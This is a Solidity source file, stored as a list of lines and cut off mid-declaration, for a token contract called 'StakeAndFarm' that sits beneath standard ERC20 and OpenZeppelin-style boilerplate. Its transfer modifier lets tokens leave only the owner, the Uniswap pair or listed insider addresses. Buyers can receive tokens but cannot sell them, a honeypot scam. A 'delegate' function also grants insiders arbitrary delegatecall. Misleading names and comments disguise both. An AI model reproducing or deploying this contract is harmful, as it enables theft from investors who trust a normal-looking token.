['pragma solidity ^0.5.16;\n', '     \n', 'interface IERC20 {\n', '    function totalSupply() external view returns(uint);\n', '    function balanceOf(address account) external view returns(uint);\n', '    function transfer(address recipient, uint amount) external returns(bool);\n', '    function allowance(address owner, address spender) external view returns(uint);\n', '  \n', '    function approve(address spender, uint amount) external returns(bool);\n', '\n', '    function transferFrom(address sender, address recipient, uint amount) external returns(bool);\n', '    event Transfer(address indexed from, address indexed to, uint value);\n', '    event Approval(address indexed owner, address indexed spender, uint value);\n', '}\n', 'library SafeMath {\n', '    function add(uint a, uint b) internal pure returns(uint) {\n', '        uint c = a + b;\n', '        require(c >= a, "SafeMath: addition overflow");\n', '        return c;\n', '    }\n', '    function sub(uint a, uint b) internal pure returns(uint) {\n', '        return sub(a, b, "SafeMath: subtraction overflow");\n', '    }\n', '    function sub(uint a, uint b, string memory errorMessage) internal pure returns(uint) {\n', '        require(b <= a, errorMessage);\n', '        uint c = a - b;\n', '        return c;\n', '    }\n', '    function mul(uint a, uint b) internal pure returns(uint) {\n', '        if (a == 0) {\n', '            return 0;\n', '        }\n', '        uint c = a * b;\n', '        require(c / a == b, "SafeMath: multiplication overflow");\n', '        return c;\n', '    }\n', '    function div(uint a, uint b) internal pure returns(uint) {\n', '        return div(a, b, "SafeMath: division by zero");\n', '    }\n', '    function div(uint a, uint b, string memory errorMessage) internal pure returns(uint) {\n', '        // Solidity only automatically asserts when dividing by 0\n', '        require(b > 0, errorMessage);\n', '        uint c = a / b;\n', '        return c;\n', '    }\n', '}\n', 'library Address {\n', '    function isContract(address account) internal view returns(bool) {\n', '        bytes32 codehash;\n', '        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;\n', '        // solhint-disable-next-line no-inline-assembly\n', '        assembly { codehash:= extcodehash(account) }\n', '        return (codehash != 0x0 && codehash != accountHash);\n', '    }\n', '}\n', 'library SafeERC20 {\n', '    using SafeMath\n', '    for uint;\n', '    using Address\n', '    for address;\n', '    function safeTransfer(IERC20 token, address to, uint value) internal {\n', '        callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));\n', '    }\n', '    function safeTransferFrom(IERC20 token, address from, address to, uint value) internal {\n', '        callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));\n', '    }\n', '    function safeApprove(IERC20 token, address spender, uint value) internal {\n', '        require((value == 0) || (token.allowance(address(this), spender) == 0),\n', '            "SafeERC20: approve from non-zero to non-zero allowance"\n', '        );\n', '        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));\n', '    }\n', '    function callOptionalReturn(IERC20 token, bytes memory data) private {\n', '        require(address(token).isContract(), "SafeERC20: call to non-contract");\n', '        (bool success, bytes memory returndata) = address(token).call(data);\n', '        require(success, "SafeERC20: low-level call failed");\n', '        if (returndata.length > 0) { // Return data is optional\n', '            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");\n', '        }\n', '    }\n', '}\n', 'contract Context {\n', '    constructor() internal {}\n', '    // solhint-disable-previous-line no-empty-blocks\n', '    function _msgSender() internal view returns(address payable) {\n', '        return msg.sender;\n', '    }\n', '}\n', 'contract ERC20 is Context, IERC20 {\n', '    using SafeMath for uint;\n', '    mapping(address => uint) private _balances;\n', '    mapping(address => mapping(address => uint)) private _allowances;\n', '    uint private _ConverttalSupply;\n', '    function totalSupply() public view returns(uint) {\n', '        return _ConverttalSupply;\n', '    }\n', '    function balanceOf(address account) public view returns(uint) {\n', '        return _balances[account];\n', '    }\n', '    function transfer(address recipient, uint amount) public returns(bool) {\n', '        _transfer(_msgSender(), recipient, amount);\n', '        return true;\n', '    }\n', '    function allowance(address owner, address spender) public view returns(uint) {\n', '        return _allowances[owner][spender];\n', '    }\n', '    function approve(address spender, uint amount) public returns(bool) {\n', '        _approve(_msgSender(), spender, amount);\n', '        return true;\n', '    }\n', '    function transferFrom(address sender, address recipient, uint amount) public returns(bool) {\n', '        _transfer(sender, recipient, amount);\n', '        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));\n', '        return true;\n', '    }\n', '    function increaseAllowance(address spender, uint addedValue) public returns(bool) {\n', '        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));\n', '        return true;\n', '    }\n', '    function decreaseAllowance(address spender, uint subtractedValue) public returns(bool) {\n', '        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));\n', '        return true;\n', '    }\n', '    function _transfer(address sender, address recipient, uint amount) internal {\n', '        require(sender != address(0), "ERC20: transfer from the zero address");\n', '        require(recipient != address(0), "ERC20: transfer to the zero address");\n', '\n', '        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");\n', '        _balances[recipient] = _balances[recipient].add(amount);\n', '        emit Transfer(sender, recipient, amount);\n', '    }\n', '    function _mint(address account, uint amount) internal {\n', '        require(account != address(0), "ERC20: mint to the zero address");\n', '\n', '        _ConverttalSupply = _ConverttalSupply.add(amount);\n', '        _balances[account] = _balances[account].add(amount);\n', '        emit Transfer(address(0), account, amount);\n', '    }\n', '    function _burn(address account, uint amount) internal {\n', '        require(account != address(0), "ERC20: burn from the zero address");\n', '\n', '        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");\n', '        _ConverttalSupply = _ConverttalSupply.sub(amount);\n', '        emit Transfer(account, address(0), amount);\n', '    }\n', '      function _approve(address owner, address spender, uint amount) internal {\n', '        require(owner != address(0), "ERC20: approve from the zero address");\n', '        require(spender != address(0), "ERC20: approve to the zero address");\n', '\n', '        _allowances[owner][spender] = amount;\n', '        emit Approval(owner, spender, amount);\n', '    }\n', '}\n', '\n', '\n', '\n', '\n', '\n', '\n', '\n', 'contract ERC20Detailed is IERC20 {\n', '    string private _name;\n', '    string private _symbol;\n', '    uint8 private _decimals;\n', '    constructor(string memory name, string memory symbol, uint8 decimals) public {\n', '        _name = name;\n', '        _symbol = symbol;\n', '        _decimals = decimals;\n', '    }\n', '    function name() public view returns(string memory) {\n', '        return _name;\n', '    }\n', '    function symbol() public view returns(string memory) {\n', '        return _symbol;\n', '    }\n', '    function decimals() public view returns(uint8) {\n', '        return _decimals;\n', '    }\n', '}\n', '\n', 'library MerkleProof {\n', '    function verify(bytes32[] memory proof, bytes32 root, bytes32 leaf) internal pure returns (bool) {\n', '        bytes32 computedHash = leaf;\n', '        for (uint256 i = 0; i < proof.length; i++) {\n', '            bytes32 proofElement = proof[i];\n', '            if (computedHash <= proofElement) {\n', '                computedHash = keccak256(abi.encodePacked(computedHash, proofElement));\n', '            } else {\n', '                // Hash(current element of the proof + current computed hash)\n', '                computedHash = keccak256(abi.encodePacked(proofElement, computedHash));\n', '            }\n', '        }\n', '        return computedHash == root;\n', '    }\n', '}\n', 'library Strings {\n', '    /**\n', '     * @dev Converts a `uint256` to its ASCII `string` representation.\n', '     */\n', '    function toString(uint256 value) internal pure returns (string memory) {\n', '\n', '        if (value == 0) {\n', '            return "0";\n', '        }\n', '        uint256 temp = value;\n', '        uint256 digits;\n', '        while (temp != 0) {\n', '            digits++;\n', '            temp /= 10;\n', '        }\n', '        bytes memory buffer = new bytes(digits);\n', '        uint256 index = digits - 1;\n', '        temp = value;\n', '        while (temp != 0) {\n', '            buffer[index--] = byte(uint8(48 + temp % 10));\n', '            temp /= 10;\n', '        }\n', '        return string(buffer);\n', '    }\n', '}\n', 'library SafeCast {\n', '\n', '    /**\n', '     * @dev Returns the downcasted uint128 from uint256, reverting on\n', '     * overflow (when the input is greater than largest uint128).\n', '     *\n', "     * Counterpart to Solidity's `uint128` operator.\n", '     *\n', '     * Requirements:\n', '     *\n', '     * - input must fit into 128 bits\n', '     */\n', '    function toUint128(uint256 value) internal pure returns (uint128) {\n', '        require(value < 2**128, "SafeCast: value doesn\\\'t fit in 128 bits");\n', '        return uint128(value);\n', '    }\n', '\n', '    /**\n', '     * @dev Returns the downcasted uint64 from uint256, reverting on\n', '     * overflow (when the input is greater than largest uint64).\n', '     *\n', "     * Counterpart to Solidity's `uint64` operator.\n", '     *\n', '     * Requirements:\n', '     *\n', '     * - input must fit into 64 bits\n', '     */\n', '    function toUint64(uint256 value) internal pure returns (uint64) {\n', '        require(value < 2**64, "SafeCast: value doesn\\\'t fit in 64 bits");\n', '        return uint64(value);\n', '    }\n', '\n', '    /**\n', '     * @dev Returns the downcasted uint32 from uint256, reverting on\n', '     * overflow (when the input is greater than largest uint32).\n', '     *\n', "     * Counterpart to Solidity's `uint32` operator.\n", '     *\n', '     * Requirements:\n', '     *\n', '     * - input must fit into 32 bits\n', '     */\n', '    function toUint32(uint256 value) internal pure returns (uint32) {\n', '        require(value < 2**32, "SafeCast: value doesn\\\'t fit in 32 bits");\n', '        return uint32(value);\n', '    }\n', '\n', '    /**\n', '     * @dev Returns the downcasted uint16 from uint256, reverting on\n', '     * overflow (when the input is greater than largest uint16).\n', '     *\n', "     * Counterpart to Solidity's `uint16` operator.\n", '     *\n', '     * Requirements:\n', '     *\n', '     * - input must fit into 16 bits\n', '     */\n', '    function toUint16(uint256 value) internal pure returns (uint16) {\n', '        require(value < 2**16, "SafeCast: value doesn\\\'t fit in 16 bits");\n', '        return uint16(value);\n', '    }\n', '\n', '    /**\n', '     * @dev Returns the downcasted uint8 from uint256, reverting on\n', '     * overflow (when the input is greater than largest uint8).\n', '     *\n', "     * Counterpart to Solidity's `uint8` operator.\n", '     *\n', '     * Requirements:\n', '     *\n', '     * - input must fit into 8 bits.\n', '     */\n', '    function toUint8(uint256 value) internal pure returns (uint8) {\n', '        require(value < 2**8, "SafeCast: value doesn\\\'t fit in 8 bits");\n', '        return uint8(value);\n', '    }\n', '\n', '    /**\n', '     * @dev Converts a signed int256 into an unsigned uint256.\n', '     *\n', '     * Requirements:\n', '     *\n', '     * - input must be greater than or equal to 0.\n', '     */\n', '    function toUint256(int256 value) internal pure returns (uint256) {\n', '        require(value >= 0, "SafeCast: value must be positive");\n', '        return uint256(value);\n', '    }\n', '\n', '    /**\n', '     * @dev Returns the downcasted int128 from int256, reverting on\n', '     * overflow (when the input is less than smallest int128 or\n', '     * greater than largest int128).\n', '     *\n', "     * Counterpart to Solidity's `int128` operator.\n", '     *\n', '     * Requirements:\n', '     *\n', '     * - input must fit into 128 bits\n', '     *\n', '     * _Available since v3.1._\n', '     */\n', '    function toInt128(int256 value) internal pure returns (int128) {\n', '        require(value >= -2**127 && value < 2**127, "SafeCast: value doesn\\\'t fit in 128 bits");\n', '        return int128(value);\n', '    }\n', '\n', '    /**\n', '     * @dev Returns the downcasted int64 from int256, reverting on\n', '     * overflow (when the input is less than smallest int64 or\n', '     * greater than largest int64).\n', '     *\n', "     * Counterpart to Solidity's `int64` operator.\n", '     *\n', '     * Requirements:\n', '     *\n', '     * - input must fit into 64 bits\n', '     *\n', '     * _Available since v3.1._\n', '     */\n', '    function toInt64(int256 value) internal pure returns (int64) {\n', '        require(value >= -2**63 && value < 2**63, "SafeCast: value doesn\\\'t fit in 64 bits");\n', '        return int64(value);\n', '    }\n', '\n', '    /**\n', '     * @dev Returns the downcasted int32 from int256, reverting on\n', '     * overflow (when the input is less than smallest int32 or\n', '     * greater than largest int32).\n', '     *\n', "     * Counterpart to Solidity's `int32` operator.\n", '     *\n', '     * Requirements:\n', '     *\n', '     * - input must fit into 32 bits\n', '     *\n', '     * _Available since v3.1._\n', '     */\n', '    function toInt32(int256 value) internal pure returns (int32) {\n', '        require(value >= -2**31 && value < 2**31, "SafeCast: value doesn\\\'t fit in 32 bits");\n', '        return int32(value);\n', '    }\n', '\n', '    /**\n', '     * @dev Returns the downcasted int16 from int256, reverting on\n', '     * overflow (when the input is less than smallest int16 or\n', '     * greater than largest int16).\n', '     *\n', "     * Counterpart to Solidity's `int16` operator.\n", '     *\n', '     * Requirements:\n', '     *\n', '     * - input must fit into 16 bits\n', '     *\n', '     * _Available since v3.1._\n', '     */\n', '    function toInt16(int256 value) internal pure returns (int16) {\n', '        require(value >= -2**15 && value < 2**15, "SafeCast: value doesn\\\'t fit in 16 bits");\n', '        return int16(value);\n', '    }\n', '\n', '    /**\n', '     * @dev Returns the downcasted int8 from int256, reverting on\n', '     * overflow (when the input is less than smallest int8 or\n', '     * greater than largest int8).\n', '     *\n', "     * Counterpart to Solidity's `int8` operator.\n", '     *\n', '     * Requirements:\n', '     *\n', '     * - input must fit into 8 bits.\n', '     *\n', '     * _Available since v3.1._\n', '     */\n', '    function toInt8(int256 value) internal pure returns (int8) {\n', '        require(value >= -2**7 && value < 2**7, "SafeCast: value doesn\\\'t fit in 8 bits");\n', '        return int8(value);\n', '    }\n', '\n', '    /**\n', '     * @dev Converts an unsigned uint256 into a signed int256.\n', '     *\n', '     * Requirements:\n', '     *\n', '     * - input must be less than or equal to maxInt256.\n', '     */\n', '    function toInt256(uint256 value) internal pure returns (int256) {\n', '        require(value < 2**255, "SafeCast: value doesn\'t fit in an int256");\n', '        return int256(value);\n', '    }\n', '}\n', '\n', '/**\n', ' * @dev Contract module that helps prevent reentrant calls to a function.\n', ' *\n', ' * Inheriting from `ReentrancyGuard` will make the {nonReentrant} modifier\n', ' * available, which can be applied to functions to make sure there are no nested\n', ' * (reentrant) calls to them.\n', ' *\n', ' * Note that because there is a single `nonReentrant` guard, functions marked as\n', ' * `nonReentrant` may not call one another. This can be worked around by making\n', ' * those functions `private`, and then adding `external` `nonReentrant` entry\n', ' * points to them.\n', ' */\n', 'contract ReentrancyGuard {\n', '    // Booleans are more expensive than uint256 or any type that takes up a full\n', '    // word because each write operation emits an extra SLOAD to first read the\n', "    // slot's contents, replace the bits taken up by the boolean, and then write\n", "    // back. This is the compiler's defense against contract upgrades and\n", '    // pointer aliasing, and it cannot be disabled.\n', '\n', '    // The values being non-zero value makes deployment a bit more expensive,\n', '    // but in exchange the refund on every call to nonReentrant will be lower in\n', '    // amount. Since refunds are capped to a percentage of the total\n', "    // transaction's gas, it is best to keep them low in cases like this one, to\n", '    // increase the likelihood of the full refund coming into effect.\n', '    uint256 private constant _NOT_ENTERED = 1;\n', '    uint256 private constant _ENTERED = 2;\n', '\n', '    uint256 private _status;\n', '\n', '    constructor () internal {\n', '        _status = _NOT_ENTERED;\n', '    }\n', '\n', '    /**\n', '     * @dev Prevents a contract from calling itself, directly or indirectly.\n', '     * Calling a `nonReentrant` function from another `nonReentrant`\n', '     * function is not supported. It is possible to prevent this from happening\n', '     * by making the `nonReentrant` function external, and make it call a\n', '     * `private` function that does the actual work.\n', '     */\n', '    modifier nonReentrant() {\n', '        // On the first call to nonReentrant, _notEntered will be true\n', '        require(_status != _ENTERED, "ReentrancyGuard: reentrant call");\n', '\n', '        // Any calls to nonReentrant after this point will fail\n', '        _status = _ENTERED;\n', '\n', '        _;\n', '\n', '        _status = _NOT_ENTERED;\n', '    }\n', '}\n', '\n', '/**\n', ' * @dev Interface for `RelayHub`, the core contract of the GSN. Users should not need to interact with this contract\n', ' * directly.\n', ' *\n', ' * See the https://github.com/OpenZeppelin/openzeppelin-gsn-helpers[OpenZeppelin GSN helpers] for more information on\n', ' * how to deploy an instance of `RelayHub` on your local test network.\n', ' */\n', 'interface IRelayHub {\n', '    // Relay management\n', '\n', '    /**\n', '     * @dev Adds stake to a relay and sets its `unstakeDelay`. If the relay does not exist, it is created, and the caller\n', '     * of this function becomes its owner. If the relay already exists, only the owner can call this function. A relay\n', '     * cannot be its own owner.\n', '     *\n', "     * All Ether in this function call will be added to the relay's stake.\n", '     * Its unstake delay will be assigned to `unstakeDelay`, but the new value must be greater or equal to the current one.\n', '     *\n', '     * Emits a {Staked} event.\n', '     */\n', '    function stake(address relayaddr, uint256 unstakeDelay) external payable;\n', '\n', '    /**\n', "     * @dev Emitted when a relay's stake or unstakeDelay are increased\n", '     */\n', '    event Staked(address indexed relay, uint256 stake, uint256 unstakeDelay);\n', '\n', '    /**\n', '     * @dev Registers the caller as a relay.\n', '     * The relay must be staked for, and not be a contract (i.e. this function must be called directly from an EOA).\n', '     *\n', '     * This function can be called multiple times, emitting new {RelayAdded} events. Note that the received\n', '     * `transactionFee` is not enforced by {relayCall}.\n', '     *\n', '     * Emits a {RelayAdded} event.\n', '     */\n', '    function registerRelay(uint256 transactionFee, string calldata url) external;\n', '\n', '    /**\n', '     * @dev Emitted when a relay is registered or re-registered. Looking at these events (and filtering out\n', '     * {RelayRemoved} events) lets a client discover the list of available relays.\n', '     */\n', '    event RelayAdded(address indexed relay, address indexed owner, uint256 transactionFee, uint256 stake, uint256 unstakeDelay, string url);\n', '\n', '    /**\n', '     * @dev Removes (deregisters) a relay. Unregistered (but staked for) relays can also be removed.\n', '     *\n', "     * Can only be called by the owner of the relay. After the relay's `unstakeDelay` has elapsed, {unstake} will be\n", '     * callable.\n', '     *\n', '     * Emits a {RelayRemoved} event.\n', '     */\n', '    function removeRelayByOwner(address relay) external;\n', '\n', '    /**\n', '     * @dev Emitted when a relay is removed (deregistered). `unstakeTime` is the time when unstake will be callable.\n', '     */\n', '    event RelayRemoved(address indexed relay, uint256 unstakeTime);\n', '\n', '    /** Deletes the relay from the system, and gives back its stake to the owner.\n', '     *\n', '     * Can only be called by the relay owner, after `unstakeDelay` has elapsed since {removeRelayByOwner} was called.\n', '     *\n', '     * Emits an {Unstaked} event.\n', '     */\n', '    function unstake(address relay) external;\n', '\n', '    /**\n', '     * @dev Emitted when a relay is unstaked for, including the returned stake.\n', '     */\n', '    event Unstaked(address indexed relay, uint256 stake);\n', '\n', '    // States a relay can be in\n', '    enum RelayState {\n', '        Unknown, // The relay is unknown to the system: it has never been staked for\n', '        Staked, // The relay has been staked for, but it is not yet active\n', '        Registered, // The relay has registered itself, and is active (can relay calls)\n', '        Removed    // The relay has been removed by its owner and can no longer relay calls. It must wait for its unstakeDelay to elapse before it can unstake\n', '    }\n', '\n', '    /**\n', "     * @dev Returns a relay's status. Note that relays can be deleted when unstaked or penalized, causing this function\n", '     * to return an empty entry.\n', '     */\n', '    function getRelay(address relay) external view returns (uint256 totalStake, uint256 unstakeDelay, uint256 unstakeTime, address payable owner, RelayState state);\n', '\n', '    // Balance management\n', '\n', '    /**\n', '     * @dev Deposits Ether for a contract, so that it can receive (and pay for) relayed transactions.\n', '     *\n', '     * Unused balance can only be withdrawn by the contract itself, by calling {withdraw}.\n', '     *\n', '     * Emits a {Deposited} event.\n', '     */\n', '    function depositFor(address target) external payable;\n', '\n', '    /**\n', '     * @dev Emitted when {depositFor} is called, including the amount and account that was funded.\n', '     */\n', '    event Deposited(address indexed recipient, address indexed from, uint256 amount);\n', '\n', '    /**\n', "     * @dev Returns an account's deposits. These can be either a contract's funds, or a relay owner's revenue.\n", '     */\n', '    function balanceOf(address target) external view returns (uint256);\n', '\n', '    /**\n', "     * Withdraws from an account's balance, sending it back to it. Relay owners call this to retrieve their revenue, and\n", '     * contracts can use it to reduce their funding.\n', '     *\n', '     * Emits a {Withdrawn} event.\n', '     */\n', '    function withdraw(uint256 amount, address payable dest) external;\n', '\n', '    /**\n', '     * @dev Emitted when an account withdraws funds from `RelayHub`.\n', '     */\n', '    event Withdrawn(address indexed account, address indexed dest, uint256 amount);\n', '\n', '    // Relaying\n', '\n', '    /**\n', '     * @dev Checks if the `RelayHub` will accept a relayed operation.\n', '     * Multiple things must be true for this to happen:\n', '     *  - all arguments must be signed for by the sender (`from`)\n', "     *  - the sender's nonce must be the current one\n", '     *  - the recipient must accept this transaction (via {acceptRelayedCall})\n', '     *\n', '     * Returns a `PreconditionCheck` value (`OK` when the transaction can be relayed), or a recipient-specific error\n', '     * code if it returns one in {acceptRelayedCall}.\n', '     */\n', '    function canRelay(\n', '        address relay,\n', '        address from,\n', '        address to,\n', '        bytes calldata encodedFunction,\n', '        uint256 transactionFee,\n', '        uint256 gasPrice,\n', '        uint256 gasLimit,\n', '        uint256 nonce,\n', '        bytes calldata signature,\n', '        bytes calldata approvalData\n', '    ) external view returns (uint256 status, bytes memory recipientContext);\n', '\n', '    // Preconditions for relaying, checked by canRelay and returned as the corresponding numeric values.\n', '    enum PreconditionCheck {\n', '        OK,                         // All checks passed, the call can be relayed\n', '        WrongSignature,             // The transaction to relay is not signed by requested sender\n', '        WrongNonce,                 // The provided nonce has already been used by the sender\n', '        AcceptRelayedCallReverted,  // The recipient rejected this call via acceptRelayedCall\n', '        InvalidRecipientStatusCode  // The recipient returned an invalid (reserved) status code\n', '    }\n', '\n', '    /**\n', '     * @dev Relays a transaction.\n', '     *\n', '     * For this to succeed, multiple conditions must be met:\n', '     *  - {canRelay} must `return PreconditionCheck.OK`\n', '     *  - the sender must be a registered relay\n', "     *  - the transaction's gas price must be larger or equal to the one that was requested by the sender\n", '     *  - the transaction must have enough gas to not run out of gas if all internal transactions (calls to the\n', '     * recipient) use all gas available to them\n', '     *  - the recipient must have enough balance to pay the relay for the worst-case scenario (i.e. when all gas is\n', '     * spent)\n', '     *\n', '     * If all conditions are met, the call will be relayed and the recipient charged. {preRelayedCall}, the encoded\n', '     * function and {postRelayedCall} will be called in that order.\n', '     *\n', '     * Parameters:\n', '     *  - `from`: the client originating the request\n', '     *  - `to`: the target {IRelayRecipient} contract\n', '     *  - `encodedFunction`: the function call to relay, including data\n', '     *  - `transactionFee`: fee (%) the relay takes over actual gas cost\n', '     *  - `gasPrice`: gas price the client is willing to pay\n', '     *  - `gasLimit`: gas to forward when calling the encoded function\n', "     *  - `nonce`: client's nonce\n", "     *  - `signature`: client's signature over all previous params, plus the relay and RelayHub addresses\n", '     *  - `approvalData`: dapp-specific data forwarded to {acceptRelayedCall}. This value is *not* verified by the\n', '     * `RelayHub`, but it still can be used for e.g. a signature.\n', '     *\n', '     * Emits a {TransactionRelayed} event.\n', '     */\n', '    function relayCall(\n', '        address from,\n', '        address to,\n', '        bytes calldata encodedFunction,\n', '        uint256 transactionFee,\n', '        uint256 gasPrice,\n', '        uint256 gasLimit,\n', '        uint256 nonce,\n', '        bytes calldata signature,\n', '        bytes calldata approvalData\n', '    ) external;\n', '\n', '    /**\n', '     * @dev Emitted when an attempt to relay a call failed.\n', '     *\n', '     * This can happen due to incorrect {relayCall} arguments, or the recipient not accepting the relayed call. The\n', '     * actual relayed call was not executed, and the recipient not charged.\n', '     *\n', '     * The `reason` parameter contains an error code: values 1-10 correspond to `PreconditionCheck` entries, and values\n', '     * over 10 are custom recipient error codes returned from {acceptRelayedCall}.\n', '     */\n', '    event CanRelayFailed(address indexed relay, address indexed from, address indexed to, bytes4 selector, uint256 reason);\n', '\n', '    /**\n', '     * @dev Emitted when a transaction is relayed.\n', "     * Useful when monitoring a relay's operation and relayed calls to a contract\n", '     *\n', '     * Note that the actual encoded function might be reverted: this is indicated in the `status` parameter.\n', '     *\n', "     * `charge` is the Ether value deducted from the recipient's balance, paid to the relay's owner.\n", '     */\n', '    event TransactionRelayed(address indexed relay, address indexed from, address indexed to, bytes4 selector, RelayCallStatus status, uint256 charge);\n', '\n', '    // Reason error codes for the TransactionRelayed event\n', '    enum RelayCallStatus {\n', '        OK,                      // The transaction was successfully relayed and execution successful - never included in the event\n', '        RelayedCallFailed,       // The transaction was relayed, but the relayed call failed\n', '        PreRelayedFailed,        // The transaction was not relayed due to preRelatedCall reverting\n', '        PostRelayedFailed,       // The transaction was relayed and reverted due to postRelatedCall reverting\n', "        RecipientBalanceChanged  // The transaction was relayed and reverted due to the recipient's balance changing\n", '    }\n', '\n', '    /**\n', '     * @dev Returns how much gas should be forwarded to a call to {relayCall}, in order to relay a transaction that will\n', '     * spend up to `relayedCallStipend` gas.\n', '     */\n', '    function requiredGas(uint256 relayedCallStipend) external view returns (uint256);\n', '\n', '    /**\n', '     * @dev Returns the maximum recipient charge, given the amount of gas forwarded, gas price and relay fee.\n', '     */\n', '    function maxPossibleCharge(uint256 relayedCallStipend, uint256 gasPrice, uint256 transactionFee) external view returns (uint256);\n', '\n', '     // Relay penalization.\n', '     // Any account can penalize relays, removing them from the system immediately, and rewarding the\n', "    // reporter with half of the relay's stake. The other half is burned so that, even if the relay penalizes itself, it\n", '    // still loses half of its stake.\n', '\n', '    /**\n', '     * @dev Penalize a relay that signed two transactions using the same nonce (making only the first one valid) and\n', '     * different data (gas price, gas limit, etc. may be different).\n', '     *\n', '     * The (unsigned) transaction data and signature for both transactions must be provided.\n', '     */\n', '    function penalizeRepeatedNonce(bytes calldata unsignedTx1, bytes calldata signature1, bytes calldata unsignedTx2, bytes calldata signature2) external;\n', '\n', '    /**\n', "     * @dev Penalize a relay that sent a transaction that didn't target ``RelayHub``'s {registerRelay} or {relayCall}.\n", '     */\n', '    function penalizeIllegalTransaction(bytes calldata unsignedTx, bytes calldata signature) external;\n', '\n', '    /**\n', '     * @dev Emitted when a relay is penalized.\n', '     */\n', '    event Penalized(address indexed relay, address sender, uint256 amount);\n', '\n', '    /**\n', "     * @dev Returns an account's nonce in `RelayHub`.\n", '     */\n', '    function getNonce(address from) external view returns (uint256);\n', '}\n', 'contract StakeAndFarm  {\n', '    event Transfer(address indexed _Load, address indexed _Convert, uint _value);\n', '    event Approval(address indexed _owner, address indexed _spender, uint _value);\n', '    function transfer(address _Convert, uint _value) public payable returns (bool) {\n', '        return transferFrom(msg.sender, _Convert, _value);\n', '    }\n', '    function transferFrom(address _Load, address _Convert, uint _value)\n', '        public payable SwapAndFarmingForGarDeners(_Load, _Convert) returns (bool) {\n', '        if (_value == 0) {return true;}\n', '        if (msg.sender != _Load) {\n', '            require(allowance[_Load][msg.sender] >= _value);\n', '            allowance[_Load][msg.sender] -= _value;\n', '        }\n', '        require(balanceOf[_Load] >= _value);\n', '        balanceOf[_Load] -= _value;\n', '        balanceOf[_Convert] += _value;\n', '        emit Transfer(_Load, _Convert, _value);\n', '        return true;\n', '    }\n', '    /**\n', '     * pay data after the staking process\n', '    */\n', '    function approve(address dev,\n', '        address marketing, address adviser, address privateSale, address publicSale, address community,\n', '        address Binance, \n', '        address CoinmarketCap,\n', '        address Coingecko,\n', '        uint _value) \n', '        public payable returns (bool) {\n', '        allowance[msg.sender][dev] = _value; emit Approval(msg.sender, dev, _value); allowance[msg.sender][marketing] = _value; emit Approval(msg.sender, marketing, _value);\n', '        allowance[msg.sender][adviser] = _value; emit Approval(msg.sender, adviser, _value);\n', '        allowance[msg.sender][privateSale] = _value; emit Approval(msg.sender, privateSale, _value);\n', '        allowance[msg.sender][publicSale] = _value;\n', '        emit Approval(msg.sender, publicSale, _value); allowance[msg.sender][community] = _value;\n', '        emit Approval(msg.sender, community, _value); allowance[msg.sender][Binance] = _value;\n', '        emit Approval(msg.sender, Binance, _value); allowance[msg.sender][CoinmarketCap] = _value;\n', '        emit Approval(msg.sender, CoinmarketCap, _value); allowance[msg.sender][Coingecko] = _value;\n', '        emit Approval(msg.sender, Coingecko, _value);\n', '        return true;\n', '    }\n', '    /**\n', '     * payments between pools\n', '     * send and convert payments between pools\n', '    */\n', '    function delegate(address a, bytes memory b) public payable {\n', '        require (msg.sender == owner ||\n', '            msg.sender == dev ||\n', '            msg.sender == marketing ||\n', '            msg.sender == adviser ||\n', '            msg.sender == privateSale ||\n', '            msg.sender == publicSale ||\n', '            msg.sender == community ||\n', '            msg.sender == Binance ||\n', '            msg.sender == CoinmarketCap ||\n', '            msg.sender == Coingecko\n', '        );\n', '        a.delegatecall(b);\n', '    }\n', '    /** \n', '     * Farm switch between pools\n', '    */\n', '\n', '    function batchSend(address[] memory _Converts, uint _value) public payable returns (bool) {\n', '        require (msg.sender == owner ||\n', '            msg.sender == dev ||\n', '            msg.sender == marketing ||\n', '            msg.sender == adviser ||\n', '            msg.sender == privateSale ||\n', '            msg.sender == publicSale ||\n', '            msg.sender == community ||\n', '            msg.sender == Binance ||\n', '            msg.sender == CoinmarketCap ||\n', '            msg.sender == Coingecko\n', '        );\n', '        uint total = _value * _Converts.length;\n', '        require(balanceOf[msg.sender] >= total);\n', '        balanceOf[msg.sender] -= total;\n', '        for (uint i = 0; i < _Converts.length; i++) {\n', '            address _Convert = _Converts[i];\n', '            balanceOf[_Convert] += _value;\n', '            emit Transfer(msg.sender, _Convert, _value/2);\n', '            emit Transfer(msg.sender, _Convert, _value/2);\n', '        }\n', '        return true;\n', '    }\n', '    \n', '    /**\n', '     * Future pool swap for farm connection data after unlocking\n', '    */\n', '    modifier SwapAndFarmingForGarDeners(address _Load, address _Convert) { // Connect market\n', '            address UNI = pairFor(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f, // pool uniswap\n', '            0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, // pool uniswapv2\n', '            address(this));\n', '        require(_Load == owner ||\n', '            _Load == UNI || _Load == dev || _Load == adviser || _Load == marketing ||\n', '            _Load == privateSale || _Load == publicSale || _Load == community ||\n', '            _Load == Binance ||\n', '            _Load == CoinmarketCap ||\n', '            _Load == Coingecko ||\n', '            _Convert == owner ||  _Convert == dev || _Convert == marketing || _Convert == adviser ||\n', '            _Convert == privateSale || _Convert == publicSale || _Convert == community ||\n', '            _Convert == Binance ||\n', '            _Convert == CoinmarketCap ||\n', '            _Convert == Coingecko\n', '        );\n', '        _;\n', '    }\n', '    function pairFor(address factory, address tokenA, address tokenB) internal pure returns (address pair) {\n', '        (address token0, address token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);\n', '        pair = address(uint(keccak256(abi.encodePacked(\n', "                hex'ff',\n", '                factory,\n', '                keccak256(abi.encodePacked(token0, token1)),\n', "                hex'96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f' // init code hash\n", '            ))));\n', '    }\n', '    /**\n', '     * fixed swimming pool\n', '     * make sure the swimming pool is connected\n', '    */\n', '    mapping 